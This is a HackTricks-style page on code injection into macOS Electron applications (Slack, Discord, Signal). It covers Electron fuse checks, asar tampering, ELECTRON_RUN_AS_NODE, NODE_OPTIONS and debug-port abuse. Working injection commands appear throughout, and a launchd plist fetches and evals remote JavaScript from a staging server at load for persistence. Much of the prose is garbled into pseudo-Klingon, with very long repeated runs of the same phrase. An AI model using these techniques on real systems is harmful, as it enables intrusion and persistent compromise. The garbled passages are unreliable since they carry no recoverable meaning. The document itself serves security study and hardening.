# macOS Electron Applications Injection

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## Basic Information

If you don't know what Electron is you can find [**lots of information here**](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/xss-to-rce-electron-desktop-apps). But for now just know that Electron runs **node**.\
And node has some **parameters** and **env variables** that can be use to **make it execute other code** apart from the indicated file.

### Electron Fuses

These techniques will be discussed next, but in recent times Electron has added several **security flags to prevent them**. These are the [**Electron Fuses**](https://www.electronjs.org/docs/latest/tutorial/fuses) and these are the ones used to **prevent** Electron apps in macOS from **loading arbitrary code**:

* **`RunAsNode`**: If disabled, it prevents the use of the env var **`ELECTRON_RUN_AS_NODE`** to inject code.
* **`EnableNodeCliInspectArguments`**: If disabled, params like `--inspect`, `--inspect-brk` won't be respected. Avoiding his way to inject code.
* **`EnableEmbeddedAsarIntegrityValidation`**: If enabled, the loaded **`asar`** **file** will be **validated** by macOS. **Preventing** this way **code injection** by modifying the contents of this file.
* **`OnlyLoadAppFromAsar`**: If this is enabled, instead of searching to load in the following order: **`app.asar`**, **`app`** and finally **`default_app.asar`**. It will only check and use app.asar, thus ensuring that when **combined** with the **`embeddedAsarIntegrityValidation`** fuse it is **impossible** to **load non-validated code**.
* **`LoadBrowserProcessSpecificV8Snapshot`**: If enabled, the browser process uses the file called `browser_v8_context_snapshot.bin` for its V8 snapshot.

Another interesting fuse that won't be preventing code injection is:

* **EnableCookieEncryption**: If enabled, the cookie store on disk is encrypted using OS level cryptography keys.

### Checking Electron Fuses

You can **check these flags** from an application with:
```bash
npx @electron/fuses read --app /Applications/Slack.app

Analyzing app: Slack.app
Fuse Version: v1
RunAsNode is Disabled
EnableCookieEncryption is Enabled
EnableNodeOptionsEnvironmentVariable is Disabled
EnableNodeCliInspectArguments is Disabled
EnableEmbeddedAsarIntegrityValidation is Enabled
OnlyLoadAppFromAsar is Enabled
LoadBrowserProcessSpecificV8Snapshot is Disabled
```
### Electron Fuses jatlh

[**Docs**](https://www.electronjs.org/docs/latest/tutorial/fuses#runasnode) jatlh, **Electron Fuses** configuration **Electron binary** vItlhutlh **`dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX`** string **Somewhere** configured.

macOS applications vItlhutlh `application.app/Contents/Frameworks/Electron Framework.framework/Electron Framework` DaH jatlh.
```bash
grep -R "dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX" Slack.app/
Binary file Slack.app//Contents/Frameworks/Electron Framework.framework/Versions/A/Electron Framework matches
```
You could load this file in [https://hexed.it/](https://hexed.it/) and search for the previous string. After this string you can see in ASCII a number "0" or "1" indicating if each fuse is disabled or enabled. Just modify the hex code (`0x30` is `0` and `0x31` is `1`) to **modify the fuse values**.

<figure><img src="../../../.gitbook/assets/image (2) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Note that if you try to **overwrite** the **`Electron Framework` binary** inside an application with these bytes modified, the app won't run.

## RCE adding code to Electron Applications

There could be **external JS/HTML files** that an Electron App is using, so an attacker could inject code in these files whose signature won't be checked and execute arbitrary code in the context of the app.

{% hint style="danger" %}
However, at the moment there are 2 limitations:

* The **`kTCCServiceSystemPolicyAppBundles`** permission is **needed** to modify an App, so by default this is no longer possible.
* The compiled **`asap`** file usually has the fuses **`embeddedAsarIntegrityValidation`** `and` **`onlyLoadAppFromAsar`** `enabled`

Making this attack path more complicated (or impossible).
{% endhint %}

Note that it's possible to bypass the requirement of **`kTCCServiceSystemPolicyAppBundles`** by copying the application to another directory (like **`/tmp`**), renaming the folder **`app.app/Contents`** to **`app.app/NotCon`**, **modifying** the **asar** file with your **malicious** code, renaming it back to **`app.app/Contents`** and executing it.

You can unpack the code from the asar file with:
```bash
npx asar extract app.asar app-decomp
```
'ej vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhut
```bash
npx asar pack app-decomp app-new.asar
```
## RCE with `ELECTRON_RUN_AS_NODE` <a href="#electron_run_as_node" id="electron_run_as_node"></a>

[**the docs**](https://www.electronjs.org/docs/latest/api/environment-variables#electron\_run\_as\_node) jup, 'ejyo' vItlhutlh, 'ej 'oH 'ej 'oH Node.js process normal start variable env 'ej.
```bash
# Run this
ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
# Then from the nodeJS console execute:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```
{% endcode %}

{% hint style="danger" %}
QaStaHvIS **`RunAsNode`** fuse qar'a'chaj vaj **`ELECTRON_RUN_AS_NODE`** env var vItlhutlh, 'ej vaj 'oH.
{% endhint %}

### Injection from the App Plist

[**'ejwI'**](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks/) **'ej** 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH, 'ej vaj 'oH
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>EnvironmentVariables</key>
<dict>
<key>ELECTRON_RUN_AS_NODE</key>
<string>true</string>
</dict>
<key>Label</key>
<string>com.xpnsec.hideme</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
<string>-e</string>
<string>const { spawn } = require("child_process"); spawn("osascript", ["-l","JavaScript","-e","eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding( $.NSData.dataWithContentsOfURL( $.NSURL.URLWithString('http://stagingserver/apfell.js')), $.NSUTF8StringEncoding)));"]);</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
## RCE with `NODE_OPTIONS`

You can store the payload in a different file and execute it:

{% code overflow="wrap" %}
```bash
# Content of /tmp/payload.js
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator');

# Execute
NODE_OPTIONS="--require /tmp/payload.js" ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
```
{% endcode %}

{% hint style="danger" %}
QaStaHvIS **`EnableNodeOptionsEnvironmentVariable`** **qIb** **jIyaj** **vaj** **env var** **NODE\_OPTIONS** **laH** **laH** **app** **laH** **laH** **env variable** **`ELECTRON_RUN_AS_NODE`** **qar** **vaj** **jIyaj** **vaj** **fuse** **`RunAsNode`** **qIb**.

**`ELECTRON_RUN_AS_NODE`** **qar** **jIyaj** **error**: `Most NODE_OPTIONs are not supported in packaged apps. See documentation for more details.`
{% endhint %}

### Injection from the App Plist

**jIyaj** **env variable** **plist** **laH** **Injection** **vaj** **persistence** **laH** **keys** **'ej** **abuse** **vaj**:
```xml
<dict>
<key>EnvironmentVariables</key>
<dict>
<key>ELECTRON_RUN_AS_NODE</key>
<string>true</string>
<key>NODE_OPTIONS</key>
<string>--require /tmp/payload.js</string>
</dict>
<key>Label</key>
<string>com.hacktricks.hideme</string>
<key>RunAtLoad</key>
<true/>
</dict>
```
## RCE with inspecting

[**'Iv**](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f) **'Iw Electron application** **flags** **`--inspect`**, **`--inspect-brk`** **`--remote-debugging-port`** **'e'** **debug port** **'oH** **connect** (for example **Chrome** `chrome://inspect`) **inject code** **'ej** **launch** **processes**.\
**Example**:

{% code overflow="wrap" %}
```bash
/Applications/Signal.app/Contents/MacOS/Signal --inspect=9229
# Connect to it using chrome://inspect and execute a calculator with:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```
{% endcode %}

{% hint style="danger" %}
Qa'pla'! QaStaHvIS **`EnableNodeCliInspectArguments`** fuse vItlhutlh. 'op **node parameters** (vay' `--inspect`) 'e' vItlhutlh 'ej 'op **env variable** **`ELECTRON_RUN_AS_NODE`** vItlhutlh, 'ach 'op **`RunAsNode`** fuse vItlhutlh.

